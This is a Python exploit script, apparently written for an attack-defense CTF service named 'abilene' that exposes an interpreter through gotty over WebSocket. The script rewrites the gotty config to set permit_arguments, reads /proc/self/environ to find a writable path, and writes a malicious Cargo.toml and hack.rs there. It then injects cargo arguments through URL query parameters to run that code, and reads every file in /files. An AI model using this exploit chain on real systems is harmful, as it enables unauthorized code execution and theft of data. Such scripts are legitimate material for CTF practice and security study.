#!/usr/bin/env python3

from abilene_lib import CheckMachine, WebSocketHandler
from checklib import BaseChecker
from threading import Thread
import sys
import re


def step4(mch: CheckMachine, filenames: list[bytes]):
    with mch.ws() as ws:
        handler = WebSocketHandler(ws=ws)
        mch.init_connection(handler)
        for filename in filenames:
            print(mch.run_program(handler, f"@{filename.decode()} ? `"))


def step3(mch: CheckMachine, path: str):
    for i in range(8):
        with mch.ws() as ws:
            handler = WebSocketHandler(ws=ws)
            mch.init_connection(handler, arguments=f"?arg={path}&arg=--manifest-path&arg={path}/Cargo.toml")
            if b"hacked" in mch.recv(handler):
                filenames = re.findall(rb'path\|(/files/[a-zA-Z0-9]+)', mch.recv(handler))
                step4(mch, filenames)


def step2(mch: CheckMachine):
    while True:
        with mch.ws() as ws:
            handler = WebSocketHandler(ws=ws)
            mch.init_connection(handler)

            environ = mch.run_program(handler, "@/proc/self/environ ? `").split(b"\x00")

            path = None

            for env in environ:
                if env.startswith(b"LD_LIBRARY_PATH="):
                    path = env[16:16+26]

            assert path is not None
            path = path.decode()

            mch.run_program(handler, f"@{path}/Cargo.toml @[package]\\n ! @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @name\\ =\\ \"abilene\"\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @version\\ =\\ \"0.1.0\"\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @edition\\ =\\ \"2021\"\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @[[bin]]\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @name\\ =\\ \"hack\"\\n % @ok , `")
            mch.run_program(handler, f"@{path}/Cargo.toml @path\\ =\\ \"hack.rs\"\\n % @ok , `")

            mch.run_program(handler, f"@{path}/hack.rs @fn\\ main()\\ {{\\n ! @ok , `")
            mch.run_program(handler, f"@{path}/hack.rs @\\ \\ println!(\"hacked\");\\n % @ok , `")
            mch.run_program(handler, f"@{path}/hack.rs @\\ \\ for\\ path\\ in\\ std::fs::read_dir(\"/files\").unwrap()\\ {{\\n % @ok , `")
            mch.run_program(handler, f"@{path}/hack.rs @\\ \\ \\ \\ println!(\"path|{{}}\",\\ path.unwrap().path().display());\\n % @ok , `")
            mch.run_program(handler, f"@{path}/hack.rs @\\ \\ }}\\n % @ok , `")
            mch.run_program(handler, f"@{path}/hack.rs @}}\\n % @ok , `")

            T = 4
            ts = [Thread(target=step3, args=(mch, path)) for _ in range(T)]
            for t in ts:
                t.start()
            for t in ts:
                t.join()


def step1(mch: CheckMachine):
    ok = False
    with mch.ws() as ws:
        handler = WebSocketHandler(ws=ws)
        mch.init_connection(handler)
        if b"permit_arguments" in mch.run_program(handler, "@/home/ctf/.gotty ? `"):
            ok = True
    if not ok:
        while True:
            with mch.ws() as ws:
                handler = WebSocketHandler(ws=ws)
                mch.init_connection(handler)
                res = mch.run_program(handler, "@/home/ctf/.gotty @permit_arguments\\ =\\ true\\n ! @ok , `")
                print(res)
                if res == b'ok':
                    break
    step2(mch)


if __name__ == "__main__":
    step2(CheckMachine(BaseChecker(sys.argv[1])))
